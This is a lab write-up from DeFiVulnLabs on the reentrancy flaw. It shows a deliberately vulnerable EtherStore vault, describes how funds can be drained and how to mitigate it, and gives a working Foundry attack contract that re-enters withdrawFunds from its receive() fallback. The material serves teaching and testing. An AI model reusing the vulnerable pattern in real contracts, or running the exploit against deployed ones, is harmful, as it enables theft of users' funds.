# Reentrancy
[Reentrancy.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Reentrancy.sol)   
**Name:** Reentrancy Vulnerability

**Description:**  
The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows
an attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract.
The vulnerability arises due to the withdrawFunds function in the EtherStore contract,
where the Ether is transferred to the attacker's address before updating their balance.
This allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update,leading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.

**Scenario:**  
EtherStore is a simple vault, it can manage everyone's ethers.
But it's vulnerable, can you steal all the ethers ?

**Mitigation:**  
Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.

**REF:**  

https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a  

https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/  

**EtherStore Contract:**  
```
contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");

        // check if after send still enough to avoid underflow
        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw;
        }
    }
}
```
**How to Test:**

forge test --contracts src/test/Reentrancy.sol-vvvv  
```  
// Function to test the EtherStore for reentrancy attack vulnerability
function testReentrancy() public {
    // Execute the Attack function of the attack contract
    attack.Attack();
}

// Contract for the attack on EtherStore
contract EtherStoreAttack is Test {
    // The EtherStore contract to be attacked
    EtherStore store;

    // Constructor function to initialize the EtherStore contract
    constructor(address _store) {
        store = EtherStore(_store);
    }

    // Function to perform the attack
    function Attack() public {
        // Log the balance of the EtherStore contract
        console.log("EtherStore balance", address(store).balance);

        // Deposit 1 ether to the EtherStore contract
        store.deposit{value: 1 ether}();

        // Log the new balance of the EtherStore contract
        console.log(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        // Withdraw 1 ether from the EtherStore contract, this is the point of exploit
        store.withdrawFunds(1 ether); 

        // Log the balance of the attacking contract
        console.log("Attack contract balance", address(this).balance);
        // Log the balance of the EtherStore contract after withdrawal
        console.log("EtherStore balance", address(store).balance);
    }

    // Fallback function to exploit reentrancy vulnerability
    receive() external payable {
        // Log the balance of the attacking contract
        console.log("Attack contract balance", address(this).balance);
        // Log the balance of the EtherStore contract
        console.log("EtherStore balance", address(store).balance);
        // If the balance of the EtherStore contract is at least 1 ether
        if (address(store).balance >= 1 ether) {
            // Withdraw 1 ether, this is the point of exploit in the fallback function
            store.withdrawFunds(1 ether); 
        }
    }
}
```  
Red box: exploited successful, drained out the EtherStore.  
![Alt text](image-3.png)  

